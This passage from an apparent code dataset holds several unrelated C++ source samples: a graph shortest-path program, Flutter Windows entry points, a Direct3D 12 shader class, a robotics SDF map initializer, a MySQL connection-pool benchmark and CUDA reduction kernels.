\"<<distance[k]<<endl;\n    }\n}\nint main()\n{\n    int graph[53][53]={\n        {0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0},\n       {1,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0},\n        {0,1,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0},\n       {0,0,1,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0},\n       {0,0,0,1,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0},\n       {0,0,0,0,1,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0},\n       {0,0,0,0,0,1,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0},\n       {0,0,0,0,0,0,1,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0},\n       {0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0},\n       {0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0},\n      {0,0,0,0,0,0,0,0,0,1,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0},\n      {0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0},\n      {0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0},      \n      {0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0},\n      {0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0},\n      {0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0},\n      {0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0},\n      {0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0},\n      {0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0},\n      {0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0},\n      {0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0},\n      {0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1},\n      {0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0},\n      {0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0},\n      {0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0},\n      {0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0},\n      {0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0},\n      {0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0},\n      {0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0},\n      {0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0},\n      {0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0},\n      {0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0},\n      {0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0},\n      {0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"sign_report_digitally\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"Shader.h\"\n#include \"Global.h\"\n#include \"Render.h\"\n#include \"Mesh.h\"\n\n\n\n\nGCShader::GCShader() {\n\n}\n\n\nGCShader::~GCShader()\n{\n\n};\n\n\n\nvoid GCShader::Render() {\n\tm_pRender->GetCommandList()->SetPipelineState(GetPso());\n\tm_pRender->GetCommandList()->SetGraphicsRootSignature(GetRootSign());\n}\n\nvoid GCShader::Initialize(GCRender* pRender, std::wstring hlslName) {\n\n}\n\nvoid GCShader::CompileShader(std::wstring hlsl) {\n\n}\n\nvoid GCShader::RootSign() {\n\tCD3DX12_ROOT_PARAMETER slotRootParameter[2];\n\n\t//int count = 0;\n\t// Create a single descriptor table of CBVs.\n\tswitch (m_count) {\n\tcase 1:\n\t{\n\t\t//CD3DX12_DESCRIPTOR_RANGE cbvTable; cbvTable.Init(D3D12_DESCRIPTOR_RANGE_TYPE_CBV, 1, 0);\n\t\t//slotRootParameter[1].InitAsDescriptorTable(1, &cbvTable);\n\t\tslotRootParameter[0].InitAsConstantBufferView(0);\n\t\tbreak;\n\t}\n\tcase 2:\n\t{\n\t\t// Add descriptor range for shader resource views (SRVs)\n\t\tCD3DX12_DESCRIPTOR_RANGE srvTable;\n\t\tsrvTable.Init(D3D12_DESCRIPTOR_RANGE_TYPE_SRV, 1, 0);\n\t\tslotRootParameter[0].InitAsDescriptorTable(1, &srvTable);\n\n\t\t// For the texture shader\n   // For the texture shader\n\t\tslotRootParameter[1].InitAsConstantBufferView(0);\n\n\t\t// Add descriptor range for sampler\n\t\t//CD3DX12_DESCRIPTOR_RANGE samplerTable;\n\t\t//samplerTable.Init(D3D12_DESCRIPTOR_RANGE_TYPE_SAMPLER, 1, 0);\n\t\t//slotRootParameter[2].InitAsDescriptorTable(1, &samplerTable);\n\t\tbreak;\n\n\t}\n\t}\n\tCD3DX12_STATIC_SAMPLER_DESC staticSample = CD3DX12_STATIC_SAMPLER_DESC(\n\t\t0, // shaderRegister\n\t\tD3D12_FILTER_MIN_MAG_MIP_LINEAR, // filter\n\t\tD3D12_TEXTURE_ADDRESS_MODE_CLAMP, // addressU\n\t\tD3D12_TEXTURE_ADDRESS_MODE_CLAMP, // addressV\n\t\tD3D12_TEXTURE_ADDRESS_MODE_CLAMP, // addressW\n\t\t0.0f, // mipLODBias\n\t\t16, // maxAnisotropy\n\t\tD3D12_COMPARISON_FUNC_ALWAYS, // comparisonFunc\n\t\tD3D12_STATIC_BORDER_COLOR_TRANSPARENT_BLACK, // borderColor\n\t\t0.0f, // minLOD\n\t\tD3D12_FLOAT32_MAX // maxLOD\n\t);\n\t// A root signature is an array of root parameters.\n\tCD3DX12_ROOT_SIGNATURE_DESC rootSigDesc(m_count, slotRootParameter, 1, &staticSample, D3D12_ROOT_SIGNATURE_FLAG_ALLOW_INPUT_ASSEMBLER_INPUT_LAYOUT);\n\t// create a root signature with a single slot which points to a descriptor range consisting of a single constant buffer\n\tID3DBlob* serializedRootSig = nullptr;\n\tID3DBlob* errorBlob = nullptr;\n\tHRESULT hr = D3D12SerializeRootSignature(&rootSigDesc, D3D_ROOT_SIGNATURE_VERSION_1,\n\t\t&serializedRootSig, &errorBlob);\n\n\tif (errorBlob != nullptr)\n\t{\n\t\t::OutputDebugStringA((char*)errorBlob->GetBufferPointer());\n\t}\n\tThrowIfFailed(hr);\n\tThrowIfFailed(m_pRender->Getmd3dDevice()->CreateRootSignature(\n\t\t0,\n\t\tserializedRootSig->GetBufferPointer(),\n\t\tserializedRootSig->GetBufferSize(),\n\t\tIID_PPV_ARGS(&m_RootSignature)));\n}\n\nvoid GCShader::Pso() {\n\t// Initialize the graphics pipeline state description\n\tZeroMemory(&psoDesc, sizeof(D3D12_GRAPHICS_PIPELINE_STATE_DESC));\n\tpsoDesc.InputLayout = { m_InputLayout.data(), (UINT)m_InputLayout.size() };\n\tpsoDesc.pRootSignature = m_RootSignature;\n\tpsoDesc.VS =\n\t{\n\t\treinterpret_cast<BYTE*>(m_vsByteCode->GetBufferPointer()),\n\t\tm_vsByteCode->GetBufferSize()\n\t};\n\tpsoDesc.PS =\n\t{\n\t\treinterpret_cast<BYTE*>(m_psByteCode->GetBufferPointer()),\n\t\tm_psByteCode->GetBufferSize()\n\t};\n\tpsoDesc.RasterizerState = CD3DX12_RASTERIZER_DESC(D3D12_DEFAULT);\n\n\t// Customize the blend state for transparency\n\tCD3DX12_BLEND_DESC blendDesc(D3D12_DEFAULT);\n\tblendDesc.RenderTarget[0].BlendEnable = TRUE;\n\tblendDesc.RenderTarget[0].SrcBlend = D3D12_BLEND_SRC_ALPHA;\n\tblendDesc.RenderTarget[0].DestBlend = D3D12_BLEND_INV_SRC_ALPHA;\n\tblendDesc.RenderTarget[0].BlendOp = D3D12_BLEND_OP_ADD;\n\tblendDesc.RenderTarget[0].SrcBlendAlpha = D3D12_BLEND_ONE;\n\tblendDesc.RenderTarget[0].DestBlendAlpha = D3D12_BLEND_ZERO;\n\tblendDesc.RenderTarget[0].BlendOpAlpha = D3D12_BLEND_OP_ADD;\n\tblendDesc.RenderTarget[0].RenderTargetWriteMask = D3D12_COLOR_WRITE_ENABLE_ALL;\n\tpsoDesc.BlendState = blendDesc;\n\n\t// Use default depth stencil state\n\tpsoDesc.DepthStencilState = CD3DX12_DEPTH_STENCIL_DESC(D3D12_DEFAULT);\n\n\t// Set other pipeline state settings\n\t//psoDesc.RasterizerState.FillMode = D3D12_FILL_MODE_WIREFRAME; //permet de voir les bordure\n\tpsoDesc.SampleMask = UINT_MAX;\n\tpsoDesc.PrimitiveTopologyType = D3D12_PRIMITIVE_TOPOLOGY_TYPE_TRIANGLE;\n\tpsoDesc.NumRenderTargets = 1;\n\tpsoDesc.RTVFormats[0] = m_pRender->GetBackBufferFormat();\n\tpsoDesc.SampleDesc.Count = m_pRender->Get4xMsaaState() ? 4 : 1;\n\tpsoDesc.SampleDesc.Quality = m_pRender->Get4xMsaaState() ? (m_pRender->Get4xMsaaQuality() - 1) : 0;\n\tpsoDesc.DSVFormat = m_pRender->GetDepthStencilFormat();\n\n\t// Create the graphics pipeline state\n\tThrowIfFailed(m_pRender->Getmd3dDevice()->CreateGraphicsPipelineState(&psoDesc, IID_PPV_ARGS(&m_PSO)));\n}\n\n\n\nID3D12RootSignature* GCShader::GetRootSign() {\n\treturn m_RootSignature;\n}\n\nID3D12PipelineState* GCShader::GetPso() {\n\treturn m_PSO;\n}\n\n\nID3DBlob* GCShader::GetmvsByteCode()\n{\n\treturn m_vsByteCode;\n};\n\nID3DBlob* GCShader::GetmpsByteCode()\n{\n\treturn m_psByteCode;\n};",
    "#include \"plan_env/sdf_map.h\"\n#include \"plan_env/map_ros.h\"\n#include <plan_env/raycast.h>\n\n#include <memory>\n\nnamespace fast_planner {\n    SDFMap::SDFMap() = default;\n\n    SDFMap::~SDFMap() = default;\n\n    void SDFMap::initMap(ros::NodeHandle &nh) {\n        mp_ = std::make_unique<MapParam>();\n        md_ = std::make_unique<MapData>();\n        mr_ = std::make_unique<MapROS>();\n\n        // Params of map properties\n        double x_size, y_size, z_size;\n        nh.param(\"sdf_map/resolution\", mp_->resolution_, -1.0);\n        nh.param(\"sdf_map/map_size_x\", x_size, -1.0);\n        nh.param(\"sdf_map/map_size_y\", y_size, -1.0);\n        nh.param(\"sdf_map/map_size_z\", z_size, -1.0);\n        nh.param(\"sdf_map/obstacles_inflation\", mp_->obstacles_inflation_, -1.0);\n        nh.param(\"sdf_map/local_bound_inflate\", mp_->local_bound_inflate_, 1.0);\n        nh.param(\"sdf_map/local_map_margin\", mp_->local_map_margin_, 1);\n        nh.param(\"sdf_map/ground_height\", mp_->ground_height_, 1.0);\n        nh.param(\"sdf_map/default_dist\", mp_->default_dist_, 5.0);\n        nh.param(\"sdf_map/optimistic\", mp_->optimistic_, true);\n        nh.param(\"sdf_map/signed_dist\", mp_->signed_dist_, false);\n\n        mp_->local_bound_inflate_ = max(mp_->resolution_, mp_->local_bound_inflate_);\n        mp_->resolution_inv_ = 1 / mp_->resolution_;\n        mp_->map_origin_ = Eigen::Vector3d(-x_size / 2.0, -y_size / 2.0, mp_->ground_height_);\n        mp_->map_size_ = Eigen::Vector3d(x_size, y_size, z_size);\n        for (Eigen::Index i = 0; i < 3; ++i)\n            mp_->map_voxel_num_(i) = ceil(mp_->map_size_(i) / mp_->resolution_);\n        mp_->map_min_boundary_ = mp_->map_origin_;\n        mp_->map_max_boundary_ = mp_->map_origin_ + mp_->map_size_;\n\n        // Params of raycasting-based fusion\n        nh.param(\"sdf_map/p_hit\", mp_->p_hit_, 0.70);\n        nh.param(\"sdf_map/p_miss\", mp_->p_miss_, 0.35);\n        nh.param(\"sdf_map/p_min\", mp_->p_min_, 0.12);\n        nh.param(\"sdf_map/p_max\", mp_->p_max_, 0.97);\n        nh.param(\"sdf_map/p_occ\", mp_->p_occ_, 0.80);\n        nh.param(\"sdf_map/max_ray_length\", mp_->max_ray_length_, -0.1);\n        nh.param(\"sdf_map/virtual_ceil_height\", mp_->virtual_ceil_height_, -0.1);\n\n        auto logit = [](const double &x) { return log(x / (1 - x)); };\n        mp_->prob_hit_log_ = logit(mp_->p_hit_);\n        mp_->prob_miss_log_ = logit(mp_->p_miss_);\n        mp_->clamp_min_log_ = logit(mp_->p_min_);\n        mp_->clamp_max_log_ = logit(mp_->p_max_);\n        mp_->min_occupancy_log_ = logit(mp_->p_occ_);\n        mp_->unknown_flag_ = 0.01;\n        cout << \"hit: \" << mp_->prob_hit_log_ << \", miss: \" << mp_->prob_miss_log_\n             << \", min: \" << mp_->clamp_min_log_ << \", max: \" << mp_->clamp_max_log_\n             << \", thresh: \" << mp_->min_occupancy_log_ << endl;\n\n        // Initialize data buffer of map\n        int buffer_size = mp_->map_voxel_num_(0) * mp_->map_voxel_num_(1) * mp_->map_voxel_num_(2);\n        md_->occupancy_buffer_ = vector<double>(buffer_size, mp_->clamp_min_log_ - mp_->unknown_flag_);\n        md_->occupancy_buffer_inflate_ = vector<char>(buffer_size, 0);\n        md_->distance_buffer_neg_ = vector<double>(buffer_size, mp_->default_dist_);\n        md_->distance_buffer_ = vector<double>(buffer_size, mp_->default_dist_);\n        md_->count_hit_and_miss_ = vector<short>(buffer_size, 0);\n        md_->count_hit_ = vector<short>(buffer_size, 0);\n        md_->count_miss_ = vector<short>(buffer_size, 0);\n        md_->flag_rayend_ = vector<char>(buffer_size, -1);\n        md_->flag_visited_ = vector<char>(buffer_size, -1);\n        md_->tmp_buffer1_ = vector<double>(buffer_size, 0);\n        md_->tmp_buffer2_ = vector<double>(buffer_size, 0);\n        md_->raycast_num_ = 0;\n        md_->reset_updated_box_ = true;\n        md_->update_min_ = md_->update_max_ = Eigen::Vector3d(0, 0, 0);\n\n        // Try retriving bounding box of map, set box to map size if not specified\n        vector<string> axis = {\"x\", \"y\", \"z\"};\n        for (Eigen::Index i = 0; i < 3; ++i) {\n            nh.param(\"sdf_map/box_min_\" + axis[i], mp_->box_mind_[i], mp_->map_min_boundary_[i]);\n            nh.param(\"sdf_map/box_max_\" + axis[i], mp_->box_maxd_[i], mp_->map_max_boundary_[i]);\n        }\n        posToIndex(mp_->box_mind_, mp_->box_min_);\n        posToIndex(mp_->box_maxd_, mp_->box_max_);\n\n        // Initialize ROS wrapper\n        mr_->setMap(this);\n        mr_->node_ = nh;\n        mr_->init();\n\n        caster_ = std::make_unique<RayCaster>();\n        caster_->setParams(mp_->resolution_, mp_->map_origin_);\n    }\n\n    void SDFMap::resetBuffer() {\n        resetBuffer(mp_->map_min_boundary_, mp_->map_max_boundary_);\n        md_->local_bound_min_ = Eigen::Vector3i::Zero();\n        md_->local_bound_max_ = mp_->map_voxel_num_ - Eigen::Vector3i::Ones();\n    }\n\n    void SDFMap::resetBuffer(const Eigen::Vector3d &min_pos, const Eigen::Vector3d &max_pos) {\n        Eigen::Vector3i min_id, max_id;\n        posToIndex(min_pos, min_id);\n        posToIndex(max_pos",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"traffic_lights\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <string>\n#include <sstream>\n#include \"connection.h\"\n#include \"connpool.h\"\n#include \"timer.h\"\n\nint main() {\n\t//Connection conn;\n\t//if (conn.connect(\"127.0.0.1\", 3306, \"root\", \"root\", \"heng\")) {\n\t//\tstd::cout << \"\u8fde\u63a5MySQL\u6210\u529f\\n\";\n\t//}\n\t//else {\n\t//\tstd::cout << \"\u8fde\u63a5MySQL\u5931\u8d25\\n\";\n\t//}\n\t//char sql[1024] = { 0 };\n\t//sprintf(sql, \"insert into user values(%d, '%s', %d, '%s');\", 9, \"\u5f20\u4e09\", 21, \"Male\");\n\t//std::string sql(R\"(update user set name = 'zhang san' where id = 1;)\");\n\t//std::string sql(R\"(delete from user where id != 1;)\");\n\t//std::vector<std::string> strVec;\n\t//strVec.push_back(R\"(insert into user values(2, 'li si', 18, 'Male'))\");\n\t//strVec.push_back(R\"(insert into user values(3, 'wang wu', 21, 'Male'))\");\n\t//strVec.push_back(R\"(insert into user values(4, 'zhao liu', 16, 'Male'))\");\n\t//strVec.push_back(R\"(insert into user values(5, 'xiao hong', 24, 'Female'))\");\n\t//strVec.push_back(R\"(insert into user values(6, 'xiao lan', 13, 'Female'))\");\n\t//for (auto& str : strVec) {\n\t//\tif (conn.update(str)) {\n\t//\t\tstd::cout << \"\u66f4\u65b0\u6570\u636e\u5e93\u6210\u529f\\n\";\n\t//\t}\n\t//\telse {\n\t//\t\tstd::cout << \"\u66f4\u65b0\u6570\u636e\u5e93\u5931\u8d25\\n\";\n\t//\t}\n\t//}\n\n\tConnection condel1;\n\tstringstream ss1;\n\tss1 << \"delete from user\";\n\tcondel1.connect(\"127.0.0.1\", 3306, \"heng\", \"root\", \"chat\");\n\tif (condel1.update(ss1.str())) {\n\t\tcout << \"\u6e05\u7a7auser\u8868\u6210\u529f\\n\";\n\t}\n\n\tTimer time1;\n\tfor (int i = 0; i < 500; ++i) {\n\t\tConnection conn;\n\t\tstringstream ss;\n\t\tss << \"insert into user values(\" << i << \", 'Royal', 30, 'Male')\";\n\t\t//cout << ss.str() << endl;\n\t\tconn.connect(\"127.0.0.1\", 3306, \"heng\", \"root\", \"chat\");\n\t\tconn.update(ss.str());\n\t\t//if (conn.update(ss.str())) {\n\t\t//\tcout << \"\u66f4\u65b0\u6210\u529f\\n\";\n\t\t//}\n\t}\n\tcout << \"without conntionPool, 1000 inserts cost: \" \n\t\t\t<< time1.getElapsedMiliseconds() << \"ms\\n\";\n\tConnection condel2;\n\tstringstream ss2;\n\tss2 << \"delete from user\";\n\tcondel2.connect(\"127.0.0.1\", 3306, \"heng\", \"root\", \"chat\");\n\tif (condel2.update(ss2.str())) {\n\t\tcout << \"\u6e05\u7a7auser\u8868\u6210\u529f\\n\";\n\t}\n\n\t// \u4f7f\u7528\u8fde\u63a5\u6c60\n\tConnPool* pool = ConnPool::getConnPool();\n\tTimer time2;\n\tfor (int i = 0; i < 500; ++i) {\n\t\tshared_ptr<Connection> pcon = pool->getConnection();\n\t\tstringstream ss;\n\t\tss << \"insert into user values(\" << i << \", 'Royal', 30, 'Male')\";\n\t\tpcon->update(ss.str());\n\t\t//cout << ss.str() << endl;\n\t\t//if (pcon->update(ss.str())) {\n\t\t//\tcout << \"\u6570\u636e\u5e93\u66f4\u65b0\u6210\u529f\\n\";\n\t\t//}\n\t\t//else {\n\t\t//\tcout << \"\u6570\u636e\u5e93\u66f4\u65b0\u5931\u8d25\\n\";\n\t\t//}\n\t}\n\tcout << \"With connectionPool, 1000 inserts cost: \" \n\t\t<< time2.getElapsedMiliseconds() << \"ms\\n\";\n\tConnection condel3;\n\tstringstream ss3;\n\tss3 << \"delete from user\";\n\tcondel3.connect(\"127.0.0.1\", 3306, \"heng\", \"root\", \"chat\");\n\tif (condel3.update(ss3.str())) {\n\t\tcout << \"\u6e05\u7a7auser\u8868\u6210\u529f\\n\";\n\t}\n\t//shared_ptr<Connection> conn1 = pool->getConnection();\n\t//bool res = conn1->update(std::string(R\"(update user set name = 'lucy' where age = 24)\"));\n\t//if (res) {\n\t//\tcout << \"\u66f4\u65b0\u6570\u636e\u6210\u529f\\n\";\n\t//}\n\t//else {\n\t//\tcout << \"\u66f4\u65b0\u6570\u636e\u5931\u8d25\\n\";\n\t//}\n}",
    "#include <iostream>\n#include <cuda_runtime.h>\n\nusing namespace std;\n\n__global__\nvoid init_kernel(long long int n, long long int *y)\n{\n    long long int global_idx = blockIdx.x * blockDim.x + threadIdx.x;\n\n\n    if (global_idx<n){\n        y[global_idx] = global_idx;\n    }\n}\n\n__global__\nvoid kernel2(long long int n, long long int *y, unsigned long long int *sum)\n{\n    long long int global_idx = blockIdx.x * blockDim.x + threadIdx.x;\n\n    long long int val = 0;\n\n    while (global_idx < n) {\n        val += static_cast<unsigned long long int>(y[global_idx]);\n        global_idx += gridDim.x * blockDim.x;\n    }\n\n    atomicAdd(sum, static_cast<unsigned long long int>(val));\n\n}\n\n// __global__\n// void kernel3(long long int n, long long int *y, unsigned long long int *sum) {\n//     // Declare shared memory for warp reduction results\n//     __shared__ unsigned long long int sdata[32]; // Each warp will have one element in shared memory\n\n//     // Thread and block indices\n//     int tid = threadIdx.x;\n//     long long int idx = threadIdx.x + blockDim.x * blockIdx.x;\n\n//     // Initialize value\n//     unsigned long long int val = 0;\n\n//     // Mask for shuffle operations\n//     unsigned mask = 0xFFFFFFFF;\n\n//     // Lane and warp IDs\n//     int lane = tid % warpSize;\n//     int warpID = tid / warpSize;\n\n//     // Grid stride loop to load data\n//     while (idx < n) {\n//         val += static_cast<unsigned long long int>(y[idx]);\n//         idx += gridDim.x * blockDim.x;\n//     }\n\n//     // First warp shuffle reduction\n//     for (int offset = warpSize / 2; offset > 0; offset >>= 1) {\n//         val += __shfl_down_sync(mask, val, offset);\n//     }\n\n//     // Store the result of each warp in shared memory\n//     if (lane == 0) sdata[warpID] = val;\n\n//     // Synchronize threads to ensure all warp results are written to shared memory\n//     __syncthreads();\n\n//     // Final reduction within warp 0\n//     if (warpID == 0) {\n//         // Reload val from shared memory if warp existed\n//         val = (tid < blockDim.x / warpSize) ? sdata[lane] : 0;\n\n//         // Final warp-shuffle reduction\n//         for (int offset = warpSize / 2; offset > 0; offset >>= 1) {\n//             val += __shfl_down_sync(mask, val, offset);\n//         }\n\n//         // The first thread writes the result to global memory\n//         if (tid == 0) atomicAdd(sum, val);\n//     }\n// }\n\n__device__ void warpReduce(volatile long long int *sdata, unsigned int tid) {\n    unsigned int blockSize = blockDim.x;\n\n    if (blockSize >= 64) sdata[tid] += sdata[tid + 32];\n    if (blockSize >= 32) sdata[tid] += sdata[tid + 16];\n    if (blockSize >= 16) sdata[tid] += sdata[tid + 8];\n    if (blockSize >= 8) sdata[tid] += sdata[tid + 4];\n    if (blockSize >= 4) sdata[tid] += sdata[tid + 2];\n    if (blockSize >= 2) sdata[tid] += sdata[tid + 1];\n}\n\n__global__ void kernel3(long long int n, long long int *g_idata, unsigned long long int *g_odata) {\n    extern __shared__ long long int sdata[];\n\n    unsigned int tid = threadIdx.x;\n    unsigned int blockSize = blockDim.x;\n    unsigned long long int i = blockIdx.x * (blockSize * 2) + tid;\n    unsigned long long int gridSize = blockSize * 2 * gridDim.x;\n\n    // Initialize shared memory\n    sdata[tid] = 0;\n\n    // Grid stride loop\n    while (i < n) {\n        sdata[tid] += g_idata[i];\n        if (i + blockSize < n) {\n            sdata[tid] += g_idata[i + blockSize];\n        }\n        i += gridSize;\n    }\n\n    __syncthreads();\n\n    // Reduce in shared memory\n    if (blockSize >= 512) { if (tid < 256) { sdata[tid] += sdata[tid + 256]; } __syncthreads(); }\n    if (blockSize >= 256) { if (tid < 128) { sdata[tid] += sdata[tid + 128]; } __syncthreads(); }\n    if (blockSize >= 128) { if (tid < 64) { sdata[tid] += sdata[tid + 64]; } 